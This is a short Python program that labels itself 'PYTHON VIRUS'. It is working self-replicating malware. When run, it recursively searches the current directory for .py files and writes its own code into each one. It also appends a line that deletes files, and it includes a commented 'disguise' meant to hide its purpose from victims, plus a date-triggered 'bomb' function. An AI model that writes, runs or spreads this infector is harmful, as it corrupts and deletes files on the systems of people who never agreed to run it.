import datetime
import os
import math
import random

SIGNATURE = "PYTHON VIRUS"
removal = "os.remove(filename)"
'''
#This is the disguise so people dont think that this is a virus
yeet=1
start=True
word=input("Type Something: ")
while start == True:
    print(str(word)*yeet)
    yeet+=1000
    if yeet == 100000000000000000:
        start = False
'''
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line: #If the file is infected
                    infected = True
                    break
            if infected == False: #If the file is not infected
                filestoinfect.append(path+"/"+fname)
    return filestoinfect

def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <58: #If adding or removing lines change this one so it adds those lines to the string
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w") #Opens the file you wish to infect
        f.write(virusstring + temp + removal) 
        f.close()

def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print("HAPPY BIRTHDAY!")
    
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
filename = os.path.basename(__file__)
bomb()
